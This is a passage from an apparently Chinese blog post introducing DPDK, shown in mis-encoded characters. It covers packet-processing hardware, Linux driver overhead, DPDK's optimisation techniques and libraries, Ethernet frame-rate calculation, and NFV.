¸å¤„ç†å™¨ï¼šåœ¨æ›´ä¸ºå¤æ‚å¤šå˜çš„é«˜å±‚åŒ…å¤„ç†ä¸Šæœ‰ä¼˜åŠ¿</li></ul><h5 id="ç¡¬ä»¶åŠ é€Ÿå™¨"><a href="#ç¡¬ä»¶åŠ é€Ÿå™¨" class="headerlink" title="ç¡¬ä»¶åŠ é€Ÿå™¨"></a>ç¡¬ä»¶åŠ é€Ÿå™¨</h5><p>ç¡¬ä»¶åŠ é€Ÿå™¨è¢«å¹¿æ³›ç”¨äºåŒ…å¤„ç†é¢†åŸŸï¼ŒASICå’ŒFPGAæ˜¯å…¶æœ€å¹¿ä¸ºé‡‡ç”¨çš„å™¨ä»¶ã€‚</p><p>ASICï¼šä¸€ç§åº”ç‰¹å®šç”¨æˆ·è¦æ±‚å’Œç‰¹å®šç”µå­ç³»ç»Ÿçš„éœ€è¦è€Œè®¾è®¡ã€åˆ¶é€ çš„é›†æˆç”µè·¯ã€‚ASICçš„ä¼˜ç‚¹æ˜¯é¢å‘ç‰¹å®šç”¨æˆ·çš„éœ€æ±‚ï¼Œåœ¨æ‰¹é‡ç”Ÿäº§æ—¶ä¸é€šç”¨é›†æˆç”µè·¯ç›¸æ¯”ä½“ç§¯æ›´å°ã€åŠŸè€—æ›´ä½ã€å¯é æ€§æ›´é«˜ã€æ€§èƒ½æé«˜ã€ä¿å¯†æ€§å¢å¼ºã€æˆæœ¬é™ä½ç­‰ã€‚ä½†ASICçš„ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå®ƒçš„çµæ´»æ€§å’Œæ‰©å±•æ€§ä¸å¤Ÿã€å¼€å‘è´¹ç”¨é«˜ã€å¼€å‘å‘¨æœŸé•¿ã€‚</p><p>FPGAï¼šç°åœºå¯ç¼–ç¨‹é—¨é˜µåˆ—ã€‚ä½œä¸ºASICé¢†åŸŸä¸­çš„ä¸€ç§åŠå®šåˆ¶ç”µè·¯è€Œå‡ºç°ï¼Œä¸ASICçš„åŒºåˆ«æ˜¯ç”¨æˆ·ä¸éœ€è¦ä»‹å…¥èŠ¯ç‰‡çš„å¸ƒå±€å¸ƒçº¿å’Œå·¥è‰ºé—®é¢˜ï¼Œè€Œä¸”å¯ä»¥éšæ—¶æ”¹å˜å…¶é€»è¾‘åŠŸèƒ½ï¼Œä½¿ç”¨çµæ´»ã€‚FPGAä»¥å¹¶è¡Œè¿ç®—ä¸ºä¸»ï¼Œå¼€å‘ç›¸å¯¹äºä¼ ç»ŸPCã€å•ç‰‡æœºå¼€å‘æœ‰å¾ˆå¤§ä¸åŒã€‚ä»¥ç¡¬ä»¶æè¿°è¯­è¨€(Verilogæˆ–VHDL)æ¥å®ç°ã€‚</p><p>å…¨å¯ç¼–ç¨‹FPGAæ¦‚å¿µçš„æå‡ºï¼Œä½¿FPGAæœç€è¿›ä¸€æ­¥è½¯åŒ–çš„æ–¹å‘æŒç»­å‘å±•ï¼Œå…¶å¹¶è¡ŒåŒ–æ•´æ•°è¿ç®—çš„èƒ½åŠ›å°†è¿›ä¸€æ­¥åœ¨é€šç”¨è®¡ç®—å®šåˆ¶åŒ–é¢†åŸŸå¾—åˆ°æŒ–æ˜ï¼Œè¿‘å¹´æ¥åœ¨æ•°æ®ä¸­å¿ƒä¸­èµ·çš„äº†å¾ˆå¤§è¿›æ­¥ï¼Œä¾‹å¦‚åº”ç”¨äºæœºå™¨å­¦ä¹ åœºåˆã€‚</p><h5 id="ç½‘ç»œå¤„ç†å™¨"><a href="#ç½‘ç»œå¤„ç†å™¨" class="headerlink" title="ç½‘ç»œå¤„ç†å™¨"></a>ç½‘ç»œå¤„ç†å™¨</h5><p>ç½‘ç»œå¤„ç†å™¨æ˜¯ä¸“é—¨ä¸ºå¤„ç†æ•°æ®åŒ…è€Œè®¾è®¡çš„å¯ç¼–ç¨‹é€šç”¨å¤„ç†å™¨ï¼Œé‡‡ç”¨å¤šå†…æ ¸å¹¶è¡Œå¤„ç†ç»“æ„ï¼Œå…¶å¸¸è¢«åº”ç”¨äºé€šä¿¡é¢†åŸŸçš„å„ç§ä»»åŠ¡ï¼Œæ¯”å¦‚åŒ…å¤„ç†ã€åè®®åˆ†æã€è·¯ç”±æŸ¥æ‰¾ã€å£°éŸ³/æ•°æ®çš„æ±‡èšã€é˜²ç«å¢™ã€QoSç­‰ã€‚å…¶é€šç”¨æ€§è¡¨ç°åœ¨æ‰§è¡Œé€»è¾‘ç”±è¿è¡Œæ—¶åŠ è½½çš„è½¯ä»¶å†³å®šï¼Œç”¨æˆ·ä½¿ç”¨ä¸“ç”¨æŒ‡ä»¤é›†å³å¾®ç (microcode)è¿›è¡Œå¼€å‘ã€‚å…¶ç¡¬ä»¶ä½“ç³»ç»“æ„å¤§å¤šé‡‡ç”¨é«˜é€Ÿçš„æ¥å£æŠ€æœ¯å’Œæ€»çº¿è§„èŒƒï¼Œå…·æœ‰è¾ƒé«˜çš„I/Oèƒ½åŠ›ï¼Œä½¿å¾—åŒ…å¤„ç†èƒ½åŠ›å¾—åˆ°å¾ˆå¤§æå‡ã€‚</p><p>å¦‚ä¸‹å›¾æ˜¯NP-5å¤„ç†å™¨æ¶æ„æ¡†å›¾ï¼Œå…¶ä¸­TOPéƒ¨åˆ†æ˜¯å¯ç¼–ç¨‹éƒ¨åˆ†ï¼Œæ ¹æ®éœ€è¦é€šè¿‡ç¼–å†™å¾®ç å®ç°ä¸šåŠ¡ç›¸å…³çš„åŒ…å¤„ç†é€»è¾‘ã€‚NPUæ‹¥æœ‰é«˜æ€§èƒ½å’Œé«˜å¯ç¼–ç¨‹æ€§ç­‰ä¼˜ç‚¹ã€‚ä½†å…¶æˆæœ¬å’Œç‰¹å®šé¢†åŸŸçš„ç‰¹æ€§é™åˆ¶äº†å®ƒçš„å¸‚åœºè§„æ¨¡ã€‚è€Œä¸åŒå‚å•†ä¸åŒæ¶æ„çš„NPUéµå¾ªçš„å¾®ç è§„èŒƒä¸å°½ç›¸åŒï¼Œå¼€å‘äººå‘˜çš„æˆé•¿ä»¥åŠç”Ÿæ€ç³»ç»Ÿçš„æ„å»ºéƒ½æ¯”è¾ƒå›°éš¾ã€‚è™½ç„¶ä¸€äº›NPUçš„å¾®ç ä¹Ÿå¼€å§‹æ”¯æŒç”±é«˜çº§è¯­è¨€(ä¾‹å¦‚C)ç¼–è¯‘ç”Ÿæˆï¼Œä½†ç”±äºç»“æ„åŒ–è¯­è¨€æœ¬èº«åŸè¯­å¹¶æœªé¢å‘åŒ…å¤„ç†ï¼Œä½¿å¾—è½¬æ¢åçš„æ•ˆç‡å¹¶ä¸ç†æƒ³ã€‚</p><p><img src="/2022/10/10/DPDKåˆæ¢/1.png" alt="1"></p><h5 id="å¤šæ ¸å¤„ç†å™¨"><a href="#å¤šæ ¸å¤„ç†å™¨" class="headerlink" title="å¤šæ ¸å¤„ç†å™¨"></a>å¤šæ ¸å¤„ç†å™¨</h5><p>ç°ä»£CPUæ€§èƒ½çš„æ‰©å±•ä¸»è¦é€šè¿‡å¤šæ ¸çš„æ–¹å¼è¿›è¡Œæ¼”è¿›ã€‚è¿™æ ·åˆ©ç”¨é€šç”¨å¤„ç†å™¨åŒæ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¹¶è¡Œåœ°å¤„ç†ç½‘ç»œè´Ÿè½½ã€‚ä¸‹å›¾æ˜¯IntelåŒè·¯æœåŠ¡å™¨å¹³å°æ¡†å›¾ï¼Œæè¿°äº†ä¸€ä¸ªå…¸å‹çš„åŒè·¯æœåŠ¡å™¨å¹³å°çš„å¤šä¸ªæ¨¡å—ï¼ŒCPUã€èŠ¯ç‰‡ç»„C612ã€å†…å­˜å’Œä»¥å¤ªç½‘æ§åˆ¶å™¨XL710æ„æˆäº†ä¸»è¦çš„æ•°æ®å¤„ç†é€šé“ã€‚åŸºäºPCIeæ€»çº¿çš„I/Oæ¥å£æä¾›äº†å¤§é‡çš„ç³»ç»Ÿæ¥å£ï¼Œä¸ºæœåŠ¡å™¨å¹³å°å¼•å…¥äº†å·®å¼‚åŒ–çš„è®¾è®¡ã€‚</p><p><img src="/2022/10/10/DPDKåˆæ¢/2.png" alt="2"></p><p>å½“å‰çš„å¤šæ ¸å¤„ç†å™¨ä¹Ÿæ­£åœ¨èµ°å‘SoCåŒ–ï¼Œé’ˆå¯¹ç½‘ç»œçš„SoCå¾€å¾€é›†æˆå†…å­˜æ§åˆ¶å™¨ã€ç½‘ç»œæ§åˆ¶å™¨ï¼Œç”šè‡³æ˜¯ä¸€äº›ç¡¬ä»¶åŠ é€Ÿå¤„ç†å¼•æ“ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ä¸»æµå‚å•†çš„å¤šæ ¸å¤„ç†å™¨çš„SoCå¹³å°</p><ul><li>IA multi-core Xeon</li><li>Tilear-TILE-Gx</li><li>Cavium Network-OCTEON &amp; OCTEON II</li><li>Freescale-QorIQ</li><li>NetLogic Microsystem-XLP</li></ul><h4 id="åˆè¯†DPDK"><a href="#åˆè¯†DPDK" class="headerlink" title="åˆè¯†DPDK"></a>åˆè¯†DPDK</h4><p>ä»¥Linuxä¸ºä¾‹ï¼Œä¼ ç»Ÿç½‘ç»œè®¾å¤‡é©±åŠ¨åŒ…å¤„ç†çš„åŠ¨ä½œå¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹ï¼š</p><ul><li>æ•°æ®åŒ…åˆ°è¾¾ç½‘å¡è®¾å¤‡</li><li>ç½‘å¡è®¾å¤‡ä¾æ®é…ç½®è¿›è¡ŒDMAæ“ä½œ</li><li>ç½‘å¡å‘é€ä¸­æ–­ï¼Œå”¤é†’å¤„ç†å™¨</li><li>é©±åŠ¨è½¯ä»¶å¡«å……è¯»å†™ç¼“å†²åŒºæ•°æ®ç»“æ„</li><li>æ•°æ®æŠ¥æ–‡åˆ°è¾¾å†…æ ¸åè®®æ ˆï¼Œè¿›è¡Œé«˜å±‚å¤„ç†</li><li>å¦‚æœæœ€ç»ˆåº”ç”¨åœ¨ç”¨æˆ·æ€ï¼Œæ•°æ®ä»å†…æ ¸æ¬ç§»åˆ°ç”¨æˆ·æ€</li><li>å¦‚æœæœ€ç»ˆåº”ç”¨åœ¨å†…æ ¸æ€ï¼Œåœ¨å†…æ ¸ç»§ç»­è¿›è¡Œ</li></ul><p>éšç€ç½‘ç»œæ¥å£å¸¦å®½ä»åƒå…†å‘ä¸‡å…†è¿ˆè¿›ï¼ŒåŸå…ˆæ¯ä¸ªæŠ¥æ–‡å°±ä¼šè§¦å‘ä¸€ä¸ªä¸­æ–­ï¼Œä¸­æ–­å¸¦æ¥çš„å¼€é”€å˜å¾—çªå‡ºã€‚å¤§é‡æ•°æ®åˆ°æ¥ä¼šè§¦å‘é¢‘ç¹çš„ä¸­æ–­å¼€é”€ï¼Œå¯¼è‡´ç³»ç»Ÿæ— æ³•æ‰¿å—ï¼Œå› æ­¤æœ‰äººåœ¨Linuxå†…æ ¸ä¸­å¼•å…¥äº†<code>NAPI</code>æœºåˆ¶ï¼Œå…¶ç­–ç•¥æ˜¯ç³»ç»Ÿè¢«ä¸­æ–­å”¤é†’åï¼Œå°½é‡ä½¿ç”¨è½®è¯¢çš„æ–¹å¼ä¸€æ¬¡å¤„ç†å¤šä¸ªæ•°æ®åŒ…ï¼Œç›´åˆ°ç½‘ç»œå†æ¬¡ç©ºé—²é‡æ–°è½¬å…¥ä¸­æ–­ç­‰å¾…ã€‚</p><p>ä¸€ä¸ªäºŒå±‚ä»¥å¤ªç½‘åŒ…ç»è¿‡ç½‘ç»œè®¾å¤‡é©±åŠ¨çš„å¤„ç†åï¼Œæœ€ç»ˆå¤§å¤šè¦äº¤ç»™ç”¨æˆ·æ€çš„åº”ç”¨ã€‚ç½‘ç»œåŒ…è¿›å…¥è®¡ç®—æœºå¤§å¤šéœ€è¦ç»è¿‡åè®®å¤„ç†ï¼Œåœ¨Linuxç³»ç»Ÿä¸­TCP/IPç”±Linuxå†…æ ¸å¤„ç†ã€‚å³ä½¿åœ¨ä¸éœ€è¦åè®®å¤„ç†çš„åœºæ™¯ä¸‹ï¼Œå¤§å¤šæ•°åœºæ™¯ä¹Ÿéœ€è¦æŠŠåŒ…ä»å†…æ ¸çš„ç¼“å†²åŒºå¤åˆ¶åˆ°ç”¨æˆ·ç¼“å†²åŒºï¼Œç³»ç»Ÿè°ƒç”¨ä»¥åŠæ•°æ®åŒ…å¤åˆ¶çš„å¼€é”€ï¼Œä¼šç›´æ¥å½±å“ç”¨æˆ·æ€åº”ç”¨ä»è®¾å¤‡ç›´æ¥è·å¾—åŒ…çš„èƒ½åŠ›ï¼Œè€Œå¯¹äºå¤šæ ·çš„ç½‘ç»œåŠŸèƒ½èŠ‚ç‚¹æ¥è¯´ï¼ŒTCP/IPåè®®æ ˆå¹¶ä¸æ˜¯æ•°æ®è½¬å‘èŠ‚ç‚¹æ‰€å¿…éœ€çš„ã€‚</p><p>å¦‚æœå†å¾€ä½¿å®æ—¶æ€§æ–¹é¢è€ƒè™‘ï¼Œä¼ ç»Ÿä¸Šï¼Œäº‹ä»¶ä»ä¸­æ–­å‘ç”Ÿåˆ°åº”ç”¨æ„ŸçŸ¥ï¼Œä¹Ÿæ˜¯è¦ç»è¿‡é•¿é•¿çš„è½¯ä»¶å¤„ç†è·¯å¾„ï¼Œæ‰€ä»¥åœ¨2010å¹´å‰é‡‡ç”¨IA(Intel Architecture)å¤„ç†å™¨çš„ç”¨æˆ·ä¼šå¾—å‡ºä¸€ä¸ªç»“è®ºï¼Œå°±æ˜¯IAä¸é€‚åˆåšåŒ…å¤„ç†ã€‚</p><h4 id="DPDKæœ€ä½³å®è·µ"><a href="#DPDKæœ€ä½³å®è·µ" class="headerlink" title="DPDKæœ€ä½³å®è·µ"></a>DPDKæœ€ä½³å®è·µ</h4><p>ç°åœ¨ï¼ŒDPDKçš„å‡ºç°å¾ˆå¥½çš„è§£ç­”äº†IAå¤šæ ¸å¤„ç†å™¨æ˜¯å¦å¯ä»¥åº”å¯¹é«˜æ€§èƒ½æ•°æ®åŒ…å¤„ç†è¿™ä¸€é—®é¢˜ã€‚</p><p>DPDKæŠ€æœ¯å¤§è‡´å½’çº³å¦‚ä¸‹ï¼š</p><ul><li>è½®è¯¢ï¼šé¿å…ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€ã€‚</li><li>ç”¨æˆ·æ€é©±åŠ¨ï¼šæ—¢è§„é¿äº†ä¸å¿…è¦çš„å†…å­˜æ‹·è´åˆé¿å…äº†ç³»ç»Ÿè°ƒç”¨ã€‚</li><li>äº²å’Œæ€§ä¸ç‹¬å ï¼šDPDKè™½ç„¶å·¥ä½œåœ¨ç”¨æˆ·æ€ï¼Œä½†æ˜¯çº¿ç¨‹çš„è°ƒåº¦ä»ç„¶ä¾èµ–å†…æ ¸ã€‚åˆ©ç”¨çº¿ç¨‹çš„CPUäº²å’Œç»‘å®šçš„æ–¹å¼ï¼Œç‰¹å®šä»»åŠ¡å¯ä»¥è¢«æŒ‡å®šåœ¨æŸä¸ªæ ¸ä¸Šå·¥ä½œã€‚å¥½å¤„æ˜¯å¯é¿å…çº¿ç¨‹åœ¨ä¸åŒæ ¸é—´é¢‘ç¹åˆ‡æ¢ï¼Œæ ¸é—´çº¿ç¨‹åˆ‡æ¢å®¹æ˜“å¯¼è‡´å› <code>cache miss</code>å’Œ<code>cache write back</code>é€ æˆçš„å¤§é‡æ€§èƒ½æŸå¤±ã€‚</li><li>é™ä½è®¿å­˜å¼€é”€ï¼šåˆ©ç”¨å†…å­˜å¤§é¡µèƒ½æœ‰æ•ˆé™ä½<code>TLB miss</code>ï¼Œåˆ©ç”¨å†…å­˜å¤šé€šé“çš„äº¤é”™è®¿é—®æœ‰æ•ˆæé«˜å†…å­˜è®¿é—®çš„æœ‰æ•ˆå¸¦å®½ï¼Œåˆ©ç”¨å¯¹äºå†…å­˜éå¯¹ç§°æ€§çš„æ„ŸçŸ¥é¿å…é¢å¤–çš„è®¿å­˜å»¶è¿Ÿã€‚</li><li>è½¯ä»¶è°ƒä¼˜ï¼šç»“æ„çš„<code>cache line</code>å¯¹é½ã€æ•°æ®åœ¨å¤šæ ¸é—´è®¿é—®é¿å…è·¨<code>cache line</code>å…±äº«ã€é€‚æ—¶åœ°é¢„å–æ•°æ®ã€å¤šå…ƒæ•°æ®æ‰¹é‡æ“ä½œç­‰</li><li>åˆ©ç”¨IAæ–°ç¡¬ä»¶æŠ€æœ¯ï¼šæ‹¿<code>Intel DDIO</code>æŠ€æœ¯æ¥è®²ï¼Œè¿™ä¸ªcacheå­ç³»ç»Ÿå¯¹DMAè®¿å­˜çš„ç¡¬ä»¶åˆ›æ–°ç›´æ¥åŠ©æ¨äº†æ€§èƒ½è·¨è¶Šå¼çš„å¢é•¿ã€‚æœ‰æ•ˆåˆ©ç”¨SIMDï¼ˆ<code>Single Instruction Multiple Data</code>ï¼‰å¹¶ç»“åˆè¶…æ ‡é‡æŠ€æœ¯ï¼ˆ<code>Superscalar</code>ï¼‰å¯¹æ•°æ®å±‚é¢æˆ–è€…å¯¹æŒ‡ä»¤å±‚é¢è¿›è¡Œæ·±åº¦å¹¶è¡ŒåŒ–ï¼Œåœ¨æ€§èƒ½çš„è¿›ä¸€æ­¥æå‡ä¸Šä¹Ÿè¡Œä¹‹æœ‰æ•ˆã€‚å¦å¤–ä¸€äº›æŒ‡ä»¤ï¼ˆæ¯”å¦‚<code>cmpxchg</code>ï¼‰ï¼Œæœ¬èº«å°±æ˜¯<code>lockless</code>æ•°æ®ç»“æ„çš„åŸºçŸ³ï¼Œè€Œ<code>crc32</code>æŒ‡ä»¤å¯¹äº<code>4 Byte Key</code>çš„å“ˆå¸Œè®¡ç®—ä¹Ÿæ˜¯æ”¹å–„æ˜æ˜¾ã€‚</li><li>å……åˆ†æŒ–æ˜ç½‘å¡çš„æ½œèƒ½ï¼šç»è¿‡<code>DPDK I/O</code>åŠ é€Ÿçš„æ•°æ®åŒ…é€šè¿‡<code>PCIe</code>ç½‘å¡è¿›å…¥ç³»ç»Ÿå†…å­˜ï¼Œ<code>PCIe</code>å¤–è®¾åˆ°ç³»ç»Ÿå†…å­˜ä¹‹é—´çš„å¸¦å®½åˆ©ç”¨æ•ˆç‡ã€æ•°æ®ä¼ é€æ–¹å¼ï¼ˆ<code>coalesce</code>æ“ä½œï¼‰ç­‰éƒ½æ˜¯ç›´æ¥å½±å“I/Oæ€§èƒ½çš„å› ç´ ã€‚åœ¨ç°ä»£ç½‘å¡ä¸­ï¼Œå¾€å¾€è¿˜æ”¯æŒä¸€äº›åˆ†æµï¼ˆå¦‚RSSï¼ŒFDIRç­‰ï¼‰å’Œå¸è½½ï¼ˆå¦‚Chksumï¼Œ TSOç­‰ï¼‰åŠŸèƒ½ã€‚DPDKå……åˆ†åˆ©ç”¨è¿™äº›ç¡¬ä»¶åŠ é€Ÿç‰¹æ€§ï¼Œå¸®åŠ©åº”ç”¨æ›´å¥½åœ°è·å¾—ç›´æ¥çš„æ€§èƒ½æå‡ã€‚</li></ul><h4 id="DPDKæ¡†æ¶ç®€ä»‹"><a href="#DPDKæ¡†æ¶ç®€ä»‹" class="headerlink" title="DPDKæ¡†æ¶ç®€ä»‹"></a>DPDKæ¡†æ¶ç®€ä»‹</h4><p>DPDKä¸ºIAä¸Šçš„é«˜é€ŸåŒ…å¤„ç†è€Œè®¾è®¡ã€‚å¤§é‡åˆ©ç”¨äº†æœ‰åŠ©äºåŒ…å¤„ç†çš„è½¯ç¡¬ä»¶ç‰¹æ€§ï¼Œå¦‚å¤§é¡µã€ç¼“å­˜è¡Œå¯¹é½ã€çº¿ç¨‹ç»‘å®šã€é¢„å–ã€NUMAã€IAæœ€æ–°æŒ‡ä»¤çš„åˆ©ç”¨ã€Intel DDIOã€å†…å­˜äº¤å‰è®¿é—®ç­‰ã€‚</p><ul><li><p>æ ¸å¿ƒåº“ Core Libsï¼Œæä¾›ç³»ç»ŸæŠ½è±¡ã€å¤§é¡µå†…å­˜ã€ç¼“å­˜æ± ã€å®šæ—¶å™¨åŠæ— é”ç¯ç­‰åŸºç¡€ç»„ä»¶ã€‚ </p></li><li><p>PMD åº“ï¼Œæä¾›å…¨ç”¨æˆ·æ€çš„é©±åŠ¨ï¼Œä»¥ä¾¿é€šè¿‡è½®è¯¢å’Œçº¿ç¨‹ç»‘å®šå¾—åˆ°æé«˜çš„ç½‘ç»œååï¼Œæ”¯æŒ å„ç§æœ¬åœ°å’Œè™šæ‹Ÿçš„ç½‘å¡ã€‚</p></li><li><p>Classify åº“ï¼Œæ”¯æŒç²¾ç¡®åŒ¹é…ï¼ˆExact Matchï¼‰ã€æœ€é•¿åŒ¹é…ï¼ˆLPMï¼‰å’Œé€šé…ç¬¦åŒ¹é…ï¼ˆACLï¼‰ï¼Œæ ä¾›å¸¸ç”¨åŒ…å¤„ç†çš„æŸ¥è¡¨æ“ä½œã€‚ </p></li><li><p>QoS åº“ï¼Œæä¾›ç½‘ç»œæœåŠ¡è´¨é‡ç›¸å…³ç»„ä»¶ï¼Œå¦‚é™é€Ÿï¼ˆMeterï¼‰å’Œè°ƒåº¦ï¼ˆSchedï¼‰ã€‚</p></li></ul><p>ä¸‹å›¾ä¸ºDPDKä¸»è¦æ¨¡å—åˆ†è§£</p><p><img src="/2022/10/10/DPDKåˆæ¢/3.png" alt="3"></p><p>é™¤äº†è¿™äº›ç»„ä»¶ï¼ŒDPDKè¿˜æä¾›äº†å‡ ä¸ªå¹³å°ç‰¹æ€§ï¼Œæ¯”å¦‚èŠ‚èƒ½è€ƒè™‘çš„è¿è¡Œæ—¶é¢‘ç‡è°ƒæ•´(POWER)ã€ä¸Linux Kernel stackå»ºç«‹å¿«é€Ÿé€šé“çš„KNI(Kernel Network Interface)ã€‚è€ŒPacket Frameworkå’ŒDISTRIBä¸ºæ­å»ºæ›´å¤æ‚çš„å¤šæ ¸æµæ°´çº¿å¤„ç†æ¨¡å‹æä¾›äº†åŸºç¡€çš„ç»„ä»¶ã€‚</p><h4 id="è§£è¯»æ•°æ®åŒ…å¤„ç†èƒ½åŠ›"><a href="#è§£è¯»æ•°æ®åŒ…å¤„ç†èƒ½åŠ›" class="headerlink" title="è§£è¯»æ•°æ®åŒ…å¤„ç†èƒ½åŠ›"></a>è§£è¯»æ•°æ®åŒ…å¤„ç†èƒ½åŠ›</h4><p>ä»¥ä»¥å¤ªç½‘ä¸ºä¾‹ï¼Œä¸€èˆ¬æ‰€è¯´çš„æ¥å£å¸¦å®½ï¼Œ1Gbit/sã€10Gbit/sã€25Gbit/sã€40Gbit/sã€ 100Gbit/sï¼Œä»£è¡¨ä»¥å¤ªæ¥å£çº¿è·¯ä¸Šæ‰€èƒ½æ‰¿è½½çš„æœ€é«˜ä¼ è¾“æ¯”ç‰¹ç‡ï¼Œå…¶å•ä½æ˜¯ bit/sï¼ˆbit per secondï¼Œ ä½ / ç§’ï¼‰ã€‚å®é™…ä¸Šï¼Œä¸å¯èƒ½æ¯ä¸ªæ¯”ç‰¹éƒ½ä¼ è¾“æœ‰æ•ˆæ•°æ®ã€‚ä»¥å¤ªç½‘æ¯ä¸ªå¸§ä¹‹é—´ä¼šæœ‰å¸§é—´è·ï¼ˆInterPacket Gapï¼ŒIPGï¼‰ï¼Œé»˜è®¤å¸§é—´è·å¤§å°ä¸º12å­—èŠ‚ã€‚æ¯ä¸ªå¸§è¿˜æœ‰7ä¸ªå­—èŠ‚çš„å‰å¯¼ï¼ˆPreambleï¼‰ï¼Œå’Œ1ä¸ªå­—èŠ‚çš„å¸§é¦–å®šç•Œç¬¦ï¼ˆStart Frame Delimiterï¼ŒSFDï¼‰ã€‚å…·ä½“å¸§æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæœ‰æ•ˆå†…å®¹ä¸»è¦æ˜¯ä»¥å¤ªç½‘çš„ç›®çš„åœ°å€ã€æºåœ°å€ã€ä»¥å¤ªç½‘ç±»å‹ã€è´Ÿè½½ã€‚æŠ¥æ–‡å°¾éƒ¨æ˜¯æ ¡éªŒç ã€‚</p><p><img src="/2022/10/10/DPDKåˆæ¢/4.png" alt="4"></p><p>é€šå¸¸æ„ä¹‰ä¸Šçš„æ»¡é€Ÿå¸¦å®½èƒ½è·‘æœ‰æ•ˆæ•°æ®çš„ååå¯ä»¥ç”±å¦‚ä¸‹å…¬å¼å¾—åˆ°ç†è®ºå¸§è½¬å‘ç‡ï¼š</p><p>å¸§è½¬å‘ç‡ = BitRate/8 / IPG+Preamble+SFD+PKtSize</p><p>è€Œè¿™ä¸ªæœ€å¤§ç†è®ºå¸§è½¬å‘ç‡çš„å€’æ•°è¡¨ç¤ºäº†çº¿é€Ÿæƒ…å†µä¸‹å…ˆåä¸¤ä¸ªåŒ…åˆ°è¾¾çš„æ—¶é—´é—´éš”</p><p>æŒ‰ç…§è¿™ä¸ªå…¬å¼ï¼Œå°†ä¸åŒåŒ…é•¿æŒ‰ç…§ç‰¹å®šçš„é€Ÿç‡è®¡ç®—å¯å¾—åˆ°ä¸€ä¸ªä»¥å¤ªå¸§è½¬å‘ç‡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯ä»¥å‘ç°åœ¨ç›¸åŒå¸¦å®½é€Ÿç‡ä¸‹ï¼ŒåŒ…é•¿è¶Šå°çš„åŒ…ï¼Œè½¬å‘ç‡è¶Šé«˜ï¼Œå¸§é—´å»¶è¿Ÿä¹Ÿè¶Šå°ã€‚</p><p><img src="/2022/10/10/DPDKåˆæ¢/5.png" alt="5"></p><h4 id="è½¯ä»¶åŒ…å¤„ç†çš„æ½œåŠ›"><a href="#è½¯ä»¶åŒ…å¤„ç†çš„æ½œåŠ›" class="headerlink" title="è½¯ä»¶åŒ…å¤„ç†çš„æ½œåŠ›"></a>è½¯ä»¶åŒ…å¤„ç†çš„æ½œåŠ›</h4><h5 id="DPDKåŠ é€Ÿç½‘ç»œèŠ‚ç‚¹"><a href="#DPDKåŠ é€Ÿç½‘ç»œèŠ‚ç‚¹" class="headerlink" title="DPDKåŠ é€Ÿç½‘ç»œèŠ‚ç‚¹"></a>DPDKåŠ é€Ÿç½‘ç»œèŠ‚ç‚¹</h5><p>DPDKè½¯ä»¶åŒ…å†…æœ‰ä¸€ä¸ªæœ€åŸºæœ¬çš„ä¸‰å±‚è½¬å‘å®ä¾‹(l3fwd)ï¼Œå¯ç”¨äºæµ‹è¯•åŒè·¯æœåŠ¡å™¨æ•´ä¸ªç³»ç»Ÿçš„ååèƒ½åŠ›ï¼Œå®éªŒè¡¨æ˜å¯ä»¥è¾¾åˆ° 220Gbit/s çš„æ•°æ®æŠ¥æ–‡ååèƒ½åŠ›ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé™¤äº†é€šè¿‡ ç¡¬ä»¶æˆ–è€…è½¯ä»¶æå‡æ€§èƒ½ä¹‹å¤–ï¼Œå¦‚ä»Š DPDK æ•´ç³»ç»ŸæŠ¥æ–‡ååèƒ½åŠ›ä¸Šé™å·²ç»ä¸å†å—é™äº CPU çš„ æ ¸æ•°ï¼Œå½“å‰ç“¶é¢ˆåœ¨äº PCIeï¼ˆIO æ€»çº¿ï¼‰çš„ LANE æ•°ã€‚æ¢å¥è¯è¯´ï¼Œç³»ç»Ÿæ€§èƒ½çš„æ•´ä½“ I/O å¤©èŠ±æ¿ä¸ å†æ˜¯ CPUï¼Œè€Œæ˜¯ç³»ç»Ÿæ‰€æä¾›çš„æ‰€æœ‰ PCIe LANE çš„å¸¦å®½ï¼Œèƒ½æ’å…¥å¤šå°‘ä¸ªé«˜é€Ÿä»¥å¤ªç½‘æ¥å£å¡ã€‚</p><p>åœ¨è¿™æ ·çš„æ€§èƒ½åŸºç¡€ä¸Šï¼Œç½‘ç»œèŠ‚ç‚¹çš„è½¯åŒ–å°±æˆä¸ºå¯èƒ½ã€‚å¯¹äºç½‘ç»œèŠ‚ç‚¹ä¸Šè¿è½¬çš„ä¸åŒå½¢æ€çš„ç½‘ç»œåŠŸèƒ½ï¼Œä¸€æ—¦è½¯åŒ–å¹¶é€‚é…åˆ°ä¸€ä¸ªé€šç”¨çš„ç¡¬ä»¶å¹³å°ï¼Œéšä¹‹ä¸€ä¸ªè‡ªç„¶çš„è¯‰æ±‚å¯èƒ½å°±æ˜¯è½¯ç¡¬ä»¶è§£è€¦ã€‚è§£è€¦æ­£æ˜¯ç½‘ç»œåŠŸèƒ½è™šæ‹ŸåŒ–ï¼ˆNFVï¼‰çš„ä¸€ä¸ªæ ¸å¿ƒæ€æƒ³ï¼Œè€Œç¡¬ä»¶è§£è€¦çš„å¤šä¸ªç½‘ç»œåŠŸèƒ½åœ¨å•ä¸€é€šç”¨èŠ‚ç‚¹ä¸Šçš„éš”ç¦»å…±ç”Ÿé—®é¢˜ï¼Œæ˜¯å¦ä¸€ä¸ªæ ¸å¿ƒæ€æƒ³è™šæ‹ŸåŒ–è¯ é‡Šçš„ã€‚å½“ç„¶è¿™ä¸ªè™šæ‹ŸåŒ–æ˜¯å¹¿ä¹‰çš„ï¼Œ åœ¨ä¸åŒå±‚é¢å¯ä»¥æœ‰ä¸åŒçš„æ”¯æ’‘æŠ€æœ¯ã€‚</p><p>NFVæœ‰å¾ˆå¤šè¯‰æ±‚ï¼Œä¸šåŠ¡é¢é«˜æ€§èƒ½ï¼Œæ§åˆ¶é¢é«˜å¯ç”¨ã€é«˜å¯é ã€æ˜“è¿ç»´ã€æ˜“ç®¡ç†ç­‰ã€‚ä½†æ²¡æœ‰ä¸šåŠ¡é¢çš„é«˜æ€§èƒ½ï¼Œåç»­çš„ä¾¿æ— 